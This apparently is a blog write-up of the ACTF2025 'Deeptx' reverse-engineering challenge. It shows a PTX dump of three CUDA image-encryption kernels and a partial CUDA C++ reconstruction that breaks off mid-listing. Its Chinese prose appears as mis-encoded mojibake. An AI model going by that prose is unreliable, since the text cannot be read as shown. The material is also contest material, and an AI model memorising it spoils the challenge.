    <content type="html"><![CDATA[<h1 id="ACTF2025-Reverse-Deeptx-WP"><a href="#ACTF2025-Reverse-Deeptx-WP" class="headerlink" title="ACTF2025 Reverse Deeptx WP"></a>ACTF2025 Reverse Deeptx WP</h1><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>åˆæ˜¯å’Œaliyunctfä¸€æ ·çš„Cudaå›¾ç‰‡è§£å¯†é¢˜ï¼Œä¸è¿‡è¿™æ¬¡ç¬¬ä¸€å±‚åŠ å¯†ä¸Šäº†è¿åŠ¨æ¨¡ç³Šå·ç§¯åŠ å¯†ï¼Œå¯¼è‡´å›¾ç‰‡è§£å¯†åˆ°è¿™ä¸€å±‚æ²¡æ³•å†è§£å¯†äº†ï¼Œåªèƒ½åˆ©ç”¨è¿åŠ¨æ¨¡ç³Šè¿˜åŸç®—æ³•æ¥è®©å›¾ç‰‡å°½å¯èƒ½æ¸…æ™°ã€‚è¿™é¢˜å› ä¸ºCudaçš„Syncå¡äº†ä¸€å¤©ï¼Œæ²¡æ³¨æ„åˆ°Layer3åŠ å¯†ä¸­çš„å‡ ä¸ªSyncæ±‡ç¼–ï¼Œå¯¼è‡´åŠ å¯†è¿˜åŸå®Œå…¨æ­£ç¡®ï¼Œä½†åŠ å¯†æ‰§è¡Œçš„æµç¨‹é”™äº†ã€‚</p><h2 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h2><p>ç¨‹åºè½½å…¥idaçœ‹åˆ°æ˜¯cudaä»£ç ç›¸å…³ï¼Œè¿™è¾¹å¤åˆ¶äº†sboxã€tboxã€motionä¸‰ä¸ªæ•°ç»„æ•°æ®åˆ°deviceï¼Œè¯»å…¥äº†flag.bmpå¹¶è·³è¿‡å‰é¢çš„bmpæ ¼å¼æ•°æ®ï¼Œè½½å…¥äº†0x10000å¤§å°çš„æ•°æ®ï¼Œå³256*256ï¼Œè¿›è¡Œäº†ä¸‰æ¬¡LayeråŠ å¯†è®¡ç®—ï¼Œæœ€åè¾“å‡ºåˆ°å›¾ç‰‡ã€‚</p><p><img src="/2025/04/27/ACTF-Deeptx/image.png" alt="alt text"></p><p>ç›´æ¥ç”¨cuobjdumpè¿›è¡Œdumpå‡ºptxæ±‡ç¼–ä»£ç ã€‚</p><p><img src="/2025/04/27/ACTF-Deeptx/image-1.png" alt="alt text"></p><p>ptxæ±‡ç¼–ä»£ç ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br></pre></td><td class="code"><pre><span class="line">Fatbin elf code:</span><br><span class="line">================</span><br><span class="line">arch = sm_86</span><br><span class="line">code version = [1,7]</span><br><span class="line">host = linux</span><br><span class="line">compile_size = 64bit</span><br><span class="line"></span><br><span class="line">Fatbin elf code:</span><br><span class="line">================</span><br><span class="line">arch = sm_86</span><br><span class="line">code version = [1,7]</span><br><span class="line">host = linux</span><br><span class="line">compile_size = 64bit</span><br><span class="line"></span><br><span class="line">Fatbin ptx code:</span><br><span class="line">================</span><br><span class="line">arch = sm_86</span><br><span class="line">code version = [8,7]</span><br><span class="line">host = linux</span><br><span class="line">compile_size = 64bit</span><br><span class="line">compressed</span><br><span class="line">ptxasOptions =</span><br><span class="line"></span><br><span class="line">//</span><br><span class="line">//</span><br><span class="line">//</span><br><span class="line">//</span><br><span class="line">//</span><br><span class="line">//</span><br><span class="line"></span><br><span class="line">.version 8.7</span><br><span class="line">.target sm_86</span><br><span class="line">.address_size 64</span><br><span class="line"></span><br><span class="line">//</span><br><span class="line">.const .align 1 .b8 cuda_sbox[256];</span><br><span class="line">.const .align 1 .b8 cuda_tbox[256];</span><br><span class="line">.const .align 4 .b8 cuda_motion[1024];</span><br><span class="line"></span><br><span class="line">.visible .entry _Z6Layer1PhS_(</span><br><span class="line">.param .u64 _Z6Layer1PhS__param_0,</span><br><span class="line">.param .u64 _Z6Layer1PhS__param_1</span><br><span class="line">)</span><br><span class="line">&#123;</span><br><span class="line">.reg .pred %p&lt;6&gt;;</span><br><span class="line">.reg .b16 %rs&lt;2&gt;;</span><br><span class="line">.reg .f32 %f&lt;12&gt;;</span><br><span class="line">.reg .b32 %r&lt;23&gt;;</span><br><span class="line">.reg .b64 %rd&lt;15&gt;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ld.param.u64 %rd5, [_Z6Layer1PhS__param_0];</span><br><span class="line">ld.param.u64 %rd6, [_Z6Layer1PhS__param_1];</span><br><span class="line">mov.u32 %r1, %tid.x;</span><br><span class="line">setp.lt.u32 %p1, %r1, 241;</span><br><span class="line">mov.u32 %r2, %ctaid.x;</span><br><span class="line">setp.lt.u32 %p2, %r2, 241;</span><br><span class="line">and.pred %p3, %p1, %p2;</span><br><span class="line">@%p3 bra $L__BB0_2;</span><br><span class="line">bra.uni $L__BB0_1;</span><br><span class="line"></span><br><span class="line">$L__BB0_2:</span><br><span class="line">mov.u32 %r3, %ntid.x;</span><br><span class="line">cvta.to.global.u64 %rd1, %rd5;</span><br><span class="line">mov.f32 %f10, 0f00000000;</span><br><span class="line">mov.u32 %r11, 0;</span><br><span class="line">mov.u64 %rd8, cuda_motion;</span><br><span class="line">mov.u32 %r20, %r11;</span><br><span class="line"></span><br><span class="line">$L__BB0_3:</span><br><span class="line">.pragma &quot;nounroll&quot;;</span><br><span class="line">add.s32 %r13, %r20, %r2;</span><br><span class="line">shl.b32 %r14, %r20, 4;</span><br><span class="line">mov.u32 %r15, 240;</span><br><span class="line">sub.s32 %r16, %r15, %r14;</span><br><span class="line">mad.lo.s32 %r21, %r13, %r3, %r1;</span><br><span class="line">mul.wide.u32 %rd7, %r16, 4;</span><br><span class="line">add.s64 %rd14, %rd8, %rd7;</span><br><span class="line">mov.u32 %r22, %r11;</span><br><span class="line"></span><br><span class="line">$L__BB0_4:</span><br><span class="line">.pragma &quot;nounroll&quot;;</span><br><span class="line">cvt.u64.u32 %rd9, %r21;</span><br><span class="line">add.s64 %rd10, %rd1, %rd9;</span><br><span class="line">ld.global.u8 %rs1, [%rd10];</span><br><span class="line">cvt.rn.f32.u16 %f7, %rs1;</span><br><span class="line">ld.const.f32 %f8, [%rd14];</span><br><span class="line">fma.rn.f32 %f10, %f8, %f7, %f10;</span><br><span class="line">add.s32 %r21, %r21, 1;</span><br><span class="line">add.s64 %rd14, %rd14, 4;</span><br><span class="line">add.s32 %r22, %r22, 1;</span><br><span class="line">setp.ne.s32 %p4, %r22, 16;</span><br><span class="line">@%p4 bra $L__BB0_4;</span><br><span class="line"></span><br><span class="line">add.s32 %r20, %r20, 1;</span><br><span class="line">setp.lt.u32 %p5, %r20, 16;</span><br><span class="line">@%p5 bra $L__BB0_3;</span><br><span class="line">bra.uni $L__BB0_6;</span><br><span class="line"></span><br><span class="line">$L__BB0_1:</span><br><span class="line">mov.f32 %f10, 0f00000000;</span><br><span class="line"></span><br><span class="line">$L__BB0_6:</span><br><span class="line">cvt.rzi.u32.f32 %r17, %f10;</span><br><span class="line">mov.u32 %r18, %ntid.x;</span><br><span class="line">mad.lo.s32 %r19, %r2, %r18, %r1;</span><br><span class="line">cvt.u64.u32 %rd11, %r19;</span><br><span class="line">cvta.to.global.u64 %rd12, %rd6;</span><br><span class="line">add.s64 %rd13, %rd12, %rd11;</span><br><span class="line">st.global.u8 [%rd13], %r17;</span><br><span class="line">ret;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">//</span><br><span class="line">.visible .entry _Z6Layer2PhS_(</span><br><span class="line">.param .u64 _Z6Layer2PhS__param_0,</span><br><span class="line">.param .u64 _Z6Layer2PhS__param_1</span><br><span class="line">)</span><br><span class="line">&#123;</span><br><span class="line">.reg .b16 %rs&lt;2&gt;;</span><br><span class="line">.reg .b32 %r&lt;8&gt;;</span><br><span class="line">.reg .b64 %rd&lt;14&gt;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ld.param.u64 %rd1, [_Z6Layer2PhS__param_0];</span><br><span class="line">ld.param.u64 %rd2, [_Z6Layer2PhS__param_1];</span><br><span class="line">cvta.to.global.u64 %rd3, %rd2;</span><br><span class="line">cvta.to.global.u64 %rd4, %rd1;</span><br><span class="line">mov.u32 %r1, %ctaid.x;</span><br><span class="line">mov.u32 %r2, %ntid.x;</span><br><span class="line">mov.u32 %r3, %tid.x;</span><br><span class="line">mad.lo.s32 %r4, %r1, %r2, %r3;</span><br><span class="line">cvt.u64.u32 %rd5, %r4;</span><br><span class="line">add.s64 %rd6, %rd4, %rd5;</span><br><span class="line">ld.global.u8 %rs1, [%rd6];</span><br><span class="line">cvt.u64.u32 %rd7, %r3;</span><br><span class="line">mov.u64 %rd8, cuda_sbox;</span><br><span class="line">add.s64 %rd9, %rd8, %rd7;</span><br><span class="line">ld.const.u8 %r5, [%rd9];</span><br><span class="line">cvt.u64.u32 %rd10, %r1;</span><br><span class="line">add.s64 %rd11, %rd8, %rd10;</span><br><span class="line">ld.const.u8 %r6, [%rd11];</span><br><span class="line">mad.lo.s32 %r7, %r2, %r5, %r6;</span><br><span class="line">cvt.u64.u32 %rd12, %r7;</span><br><span class="line">add.s64 %rd13, %rd3, %rd12;</span><br><span class="line">st.global.u8 [%rd13], %rs1;</span><br><span class="line">ret;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">//</span><br><span class="line">.visible .entry _Z6Layer3PhS_(</span><br><span class="line">.param .u64 _Z6Layer3PhS__param_0,</span><br><span class="line">.param .u64 _Z6Layer3PhS__param_1</span><br><span class="line">)</span><br><span class="line">&#123;</span><br><span class="line">.reg .pred %p&lt;5&gt;;</span><br><span class="line">.reg .b16 %rs&lt;33&gt;;</span><br><span class="line">.reg .b32 %r&lt;52&gt;;</span><br><span class="line">.reg .b64 %rd&lt;24&gt;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ld.param.u64 %rd6, [_Z6Layer3PhS__param_0];</span><br><span class="line">ld.param.u64 %rd5, [_Z6Layer3PhS__param_1];</span><br><span class="line">mov.u32 %r21, %ntid.x;</span><br><span class="line">mov.u32 %r1, %ctaid.x;</span><br><span class="line">mul.lo.s32 %r49, %r1, %r21;</span><br><span class="line">mov.u32 %r3, %tid.x;</span><br><span class="line">add.s32 %r22, %r49, %r3;</span><br><span class="line">cvt.u64.u32 %rd1, %r22;</span><br><span class="line">cvta.to.global.u64 %rd2, %rd6;</span><br><span class="line">add.s64 %rd3, %rd2, %rd1;</span><br><span class="line">cvt.u16.u32 %rs8, %r3;</span><br><span class="line">cvt.u16.u32 %rs9, %r1;</span><br><span class="line">or.b16 %rs10, %rs9, %rs8;</span><br><span class="line">ld.global.u8 %rs11, [%rd3];</span><br><span class="line">xor.b16 %rs12, %rs11, %rs10;</span><br><span class="line">st.global.u8 [%rd3], %rs12;</span><br><span class="line">bar.sync 0;</span><br><span class="line">and.b32 %r23, %r3, 7;</span><br><span class="line">setp.ne.s32 %p1, %r23, 0;</span><br><span class="line">@%p1 bra $L__BB2_4;</span><br><span class="line"></span><br><span class="line">ld.global.u32 %r47, [%rd3+4];</span><br><span class="line">ld.global.u32 %r48, [%rd3];</span><br><span class="line">mov.u32 %r46, 1786956040;</span><br><span class="line">mov.u32 %r45, 0;</span><br><span class="line"></span><br><span class="line">$L__BB2_2:</span><br><span class="line">.pragma &quot;nounroll&quot;;</span><br><span class="line">shl.b32 %r26, %r48, 4;</span><br><span class="line">add.s32 %r27, %r26, 1386807340;</span><br><span class="line">shr.u32 %r28, %r48, 5;</span><br><span class="line">add.s32 %r29, %r28, 2007053320;</span><br><span class="line">xor.b32 %r30, %r29, %r27;</span><br><span class="line">add.s32 %r31, %r48, %r46;</span><br><span class="line">xor.b32 %r32, %r30, %r31;</span><br><span class="line">add.s32 %r47, %r32, %r47;</span><br><span class="line">shl.b32 %r33, %r47, 4;</span><br><span class="line">add.s32 %r34, %r33, 621668851;</span><br><span class="line">add.s32 %r35, %r46, %r47;</span><br><span class="line">xor.b32 %r36, %r34, %r35;</span><br><span class="line">shr.u32 %r37, %r47, 5;</span><br><span class="line">add.s32 %r38, %r37, -862448841;</span><br><span class="line">xor.b32 %r39, %r36, %r38;</span><br><span class="line">sub.s32 %r48, %r48, %r39;</span><br><span class="line">add.s32 %r46, %r46, -1708609273;</span><br><span class="line">add.s32 %r45, %r45, 1;</span><br><span class="line">setp.ne.s32 %p2, %r45, 3238567;</span><br><span class="line">@%p2 bra $L__BB2_2;</span><br><span class="line"></span><br><span class="line">st.global.u32 [%rd3], %r48;</span><br><span class="line">st.global.u32 [%rd3+4], %r47;</span><br><span class="line"></span><br><span class="line">$L__BB2_4:</span><br><span class="line">bar.sync 0;</span><br><span class="line">and.b16 %rs16, %rs9, %rs8;</span><br><span class="line">ld.global.u8 %rs17, [%rd3];</span><br><span class="line">xor.b16 %rs18, %rs17, %rs16;</span><br><span class="line">st.global.u8 [%rd3], %rs18;</span><br><span class="line">bar.sync 0;</span><br><span class="line">cvt.u64.u32 %rd7, %r3;</span><br><span class="line">mov.u64 %rd8, cuda_sbox;</span><br><span class="line">add.s64 %rd9, %rd8, %rd7;</span><br><span class="line">ld.const.u8 %rs31, [%rd9];</span><br><span class="line">cvta.to.global.u64 %rd4, %rd5;</span><br><span class="line">mov.u16 %rs32, 0;</span><br><span class="line">mov.u32 %r50, 0;</span><br><span class="line">mov.u64 %rd14, cuda_tbox;</span><br><span class="line"></span><br><span class="line">$L__BB2_5:</span><br><span class="line">.pragma &quot;nounroll&quot;;</span><br><span class="line">cvt.u64.u32 %rd10, %r49;</span><br><span class="line">add.s64 %rd11, %rd2, %rd10;</span><br><span class="line">cvt.u64.u16 %rd12, %rs31;</span><br><span class="line">and.b64 %rd13, %rd12, 255;</span><br><span class="line">add.s64 %rd15, %rd14, %rd13;</span><br><span class="line">ld.const.u8 %rs19, [%rd15];</span><br><span class="line">ld.global.u8 %rs20, [%rd11];</span><br><span class="line">mul.lo.s16 %rs21, %rs19, %rs20;</span><br><span class="line">add.s16 %rs32, %rs21, %rs32;</span><br><span class="line">mul.lo.s16 %rs22, %rs31, 5;</span><br><span class="line">add.s16 %rs31, %rs22, 17;</span><br><span class="line">add.s32 %r49, %r49, 1;</span><br><span class="line">add.s32 %r50, %r50, 1;</span><br><span class="line">setp.ne.s32 %p3, %r50, 256;</span><br><span class="line">@%p3 bra $L__BB2_5;</span><br><span class="line"></span><br><span class="line">xor.b32 %r18, %r1, %r3;</span><br><span class="line">mov.u32 %r51, 8;</span><br><span class="line"></span><br><span class="line">$L__BB2_7:</span><br><span class="line">.pragma &quot;nounroll&quot;;</span><br><span class="line">shl.b16 %rs23, %rs32, 3;</span><br><span class="line">and.b16 %rs24, %rs32, 224;</span><br><span class="line">shr.u16 %rs25, %rs24, 5;</span><br><span class="line">or.b16 %rs26, %rs25, %rs23;</span><br><span class="line">cvt.u32.u16 %r42, %rs26;</span><br><span class="line">mad.lo.s32 %r43, %r42, 13, %r18;</span><br><span class="line">and.b32 %r44, %r51, 255;</span><br><span class="line">cvt.u64.u32 %rd16, %r44;</span><br><span class="line">add.s64 %rd18, %rd14, %rd16;</span><br><span class="line">cvt.u16.u32 %rs27, %r43;</span><br><span class="line">ld.const.u8 %rs28, [%rd18];</span><br><span class="line">xor.b16 %rs29, %rs28, %rs27;</span><br><span class="line">cvt.u64.u16 %rd19, %rs29;</span><br><span class="line">and.b64 %rd20, %rd19, 255;</span><br><span class="line">add.s64 %rd22, %rd8, %rd20;</span><br><span class="line">ld.const.u8 %rs32, [%rd22];</span><br><span class="line">add.s32 %r51, %r51, 1;</span><br><span class="line">setp.ne.s32 %p4, %r51, 4137823;</span><br><span class="line">@%p4 bra $L__BB2_7;</span><br><span class="line"></span><br><span class="line">add.s64 %rd23, %rd4, %rd1;</span><br><span class="line">st.global.u8 [%rd23], %rs32;</span><br><span class="line">ret;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æŒ‰ptxæ±‡ç¼–é€è¡Œè¿˜åŸä¸‰ä¸ªlayeråŠ å¯†å‡½æ•°ã€‚</p><p>bar.sync 0;è¿™å‡ è¡Œæ±‡ç¼–å¾ˆé‡è¦ï¼Œä¼šè®©æ‰€æœ‰gpuçº¿ç¨‹éƒ½åŒæ­¥æ‰§è¡Œåˆ°è¿™è¾¹æ‰ç»§ç»­å¾€ä¸‹è¿›è¡ŒåŠ å¯†ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;cuda_runtime.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;device_launch_parameters.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line">__constant__ <span class="type">uint8_t</span> cuda_sbox[<span class="number">256</span>];</span><br><span class="line">__constant__ <span class="type">uint8_t</span> cuda_tbox[<span class="number">256</span>];</span><br><span class="line">__constant__ <span class="type">float</span> cuda_motion[<span class="number">256</span>];</span><br><span class="line"></span><br><span class="line"><span class="function">__global__ <span class="type">void</span> <span class="title">Layer1</span><span class="params">(<span class="type">uint8_t</span>* Input, <span class="type">uint8_t</span>* Output)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> tid = threadIdx.x;</span><br><span class="line">    <span class="type">int</span> bid = blockIdx.x;</span><br><span class="line">    <span class="type">int</span> bdim = blockDim.x;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (tid &gt;= <span class="number">241</span> || bid &gt;= <span class="number">241</span>)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">float</span> sum = <span class="number">0.f</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">16</span>; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">int</span> Index = (i + bid) * bdim + (tid + j);</span><br><span class="line">            sum += cuda_motion[<span class="number">240</span> - (i * <span class="number">16</span>) + j] * (<span class="type">float</span>)(Input[Index]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Output[bid * bdim + tid] = (<span class="type">uint8_t</span>)(sum);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">__global__ <span class="type">void</span> <span class="title">Layer2</span><span class="params">(<span class="type">uint8_t</span>* Input, <span class="type">uint8_t</span>* Output)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> tid = threadIdx.x;</span><br><span class="line">    <span class="type">int</span> bid = blockIdx.x;</span><br><span class="line">    <span class="type">int</span> bdim = blockDim.x;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint8_t</span> Value = Input[bid * bdim + tid];</span><br><span class="line">    <span class="type">int</span> Index = bdim * cuda_sbox[tid] + cuda_sbox[bid];</span><br><span class="line">    Output[Index] = Value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">__global__ <span class="type">void</span> <span class="title">Layer3</span><span class="params">(<span class="type">uint8_t</span>* Input, <span class="type">uint8_t</span>* Output)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> tid = threadIdx.x;</span><br><span class="line">    <span class="type">int</span> bid = blockIdx.x;</span><br><span class="line">    <span class="type">int</span> bdim = blockDim.x;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> CurIndex = bdim * bid + tid;</span><br><span class="line"></span><br><span class="line">    Input[CurIndex] ^= tid | bid;</span><br><span class="line"></span><br><span class="line">    __syncthreads();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((CurIndex &amp; <span class="number">7</span>) == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">uint32_t</span> v0 = *(<span class="type">uint32_t</span>*)(Input + CurIndex);</span><br><span class="line">        <span class="type">uint32_t</span> v1 = *(<span class="type">uint32_t</span>*)(Input + CurIndex + <span class="number">4</span>);</span><br><span class="line">        <span class="type">uint32_t</span> sum = <span class="number">1786956040</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">3238567</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            v1 += ((v0 &lt;&lt; <span class="number">4</span>) + <span class="number">1386807340</span>) ^ ((v0 &gt;&gt; <span class="number">5</span>) + <span class="number">2007053320</span>) ^ (v0 + sum);</span><br><span class="line">            v0 -= ((v1 &lt;&lt; <span class="number">4</span>) + <span class="number">621668851</span>) ^ ((v1 &gt;&gt; <span class="number">5</span>) - <span class="number">862448841</span>) ^ (v1 + sum);</span><br><span class="line">            sum += <span class="number">-1708609273</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        *(<span class="type">uint32_t</span>*)(Input + CurIndex) = v0;</span><br><span class="line">        *(<span class="type">uint32_t</span>*)(Input + CurIndex + <span class="number">4</span>) = v1;</span><br><span class="line">    &#125;</span><br><span class="line">    __syncthreads();</span><br><span class="line"></span><br><span class="line">    Input[CurIndex] ^= bid &amp; tid;</span><br><span class="line"></span><br><span class="line">    __syncthreads();</span><br><span class="line"></span><br><span class="line">    <span class="type">uint8_t</span> tmp = cuda_sbox[tid];</span><br><span class="line">    <span class="type">uint16_t</span> v = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span 